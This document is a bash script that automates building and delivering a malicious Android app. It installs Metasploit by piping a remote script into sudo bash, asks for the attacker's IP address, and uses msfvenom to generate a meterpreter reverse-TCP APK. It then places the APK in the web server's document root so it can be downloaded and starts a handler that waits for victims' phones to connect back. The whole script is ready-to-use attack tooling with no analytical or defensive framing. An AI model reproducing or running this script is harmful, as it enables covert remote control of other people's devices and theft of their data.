#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
  echo -e "\e[1;31mThis script must be run as root. Please use sudo.\e[0m"
  exit 1
fi

# Function to print a section header
print_header() {
  echo -e "\e[1;34m########################################################\e[0m"
  echo -e "\e[1;34m# $1\e[0m"
  echo -e "\e[1;34m########################################################\e[0m"
}

# Function to print a success message
print_success() {
  echo -e "\e[1;32m$1\e[0m"
}

# Function to print an error message
print_error() {
  echo -e "\e[1;31m$1\e[0m"
}

# Function to update and upgrade the system
update_system() {
  print_header "Updating and Upgrading the System"
  sudo apt-get update -y && sudo apt-get upgrade -y
  if [ $? -eq 0 ]; then
    print_success "System updated and upgraded successfully."
  else
    print_error "Failed to update the system. Please check your internet connection."
    exit 1
  fi
}

# Function to check if metasploit is installed
check_metasploit() {
  print_header "Checking Metasploit Installation"
  if ! command -v msfconsole &> /dev/null; then
    echo -e "\e[33mMetasploit is not installed. Installing now...\e[0m"
    install_metasploit
  else
    print_success "Metasploit is already installed."
  fi
}

# Function to install metasploit
install_metasploit() {
  print_header "Installing Metasploit"
  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/installation-ubuntu.sh | sudo bash
  if [ $? -eq 0 ]; then
    print_success "Metasploit installed successfully."
  else
    print_error "Failed to install Metasploit. Please check the installation script or your internet connection."
    exit 1
  fi
}

# Function to get IP address
get_ip_address() {
  print_header "Retrieving IP Address"
  if command -v ifconfig &> /dev/null; then
    ifconfig
  else
    print_error "ifconfig command not found. Please enter your IP address manually."
  fi
  read -p $'\e[1;36mEnter your IP address (LHOST): \e[0m' attacker_ip
}

# Function to start Apache and PostgreSQL services
start_services() {
  print_header "Starting Services"
  
  echo -e "\e[34mStarting Apache server...\e[0m"
  sudo service apache2 start
  if [ $? -eq 0 ]; then
    print_success "Apache server started successfully."
  else
    print_error "Failed to start Apache server."
    exit 1
  fi
  
  echo -e "\e[34mStarting PostgreSQL service...\e[0m"
  sudo service postgresql start
  if [ $? -eq 0 ]; then
    print_success "PostgreSQL service started successfully."
  else
    print_error "Failed to start PostgreSQL service."
    exit 1
  fi
}

# Function to create the malicious APK
create_malicious_apk() {
  print_header "Creating Malicious APK"
  read -p $'\e[1;36mEnter the unique name for your malicious APK file (without extension): \e[0m' apk_name
  apk_path="/var/www/html/${apk_name}.apk"
  
  echo -e "\e[34mGenerating the malicious APK with msfvenom...\e[0m"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=4444 R > $apk_path
  
  if [ $? -eq 0 ]; then
    print_success "Malicious APK generated successfully at $apk_path"
  else
    print_error "Failed to generate the malicious APK."
    exit 1
  fi
}

# Function to start Metasploit handler in the same terminal
start_metasploit_handler() {
  print_header "Starting Metasploit Handler"
  read -p $'\e[1;36mDo you want to run the exploit? (y/n): \e[0m' run_exploit
  if [ "$run_exploit" == "y" ]; then
    echo -e "\e[34mStarting Metasploit handler...\e[0m"
    msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD android/meterpreter/reverse_tcp;
set LHOST $attacker_ip;
set LPORT 4444;
exploit;
"
    print_success "Metasploit handler started. Waiting for the connection..."
  else
    print_error "Exploit not run. Terminating script."
    exit 0
  fi
}

# Main script execution
print_header "Starting the Setup"
update_system
check_metasploit
get_ip_address
start_services
create_malicious_apk
start_metasploit_handler
print_success "Setup completed successfully."
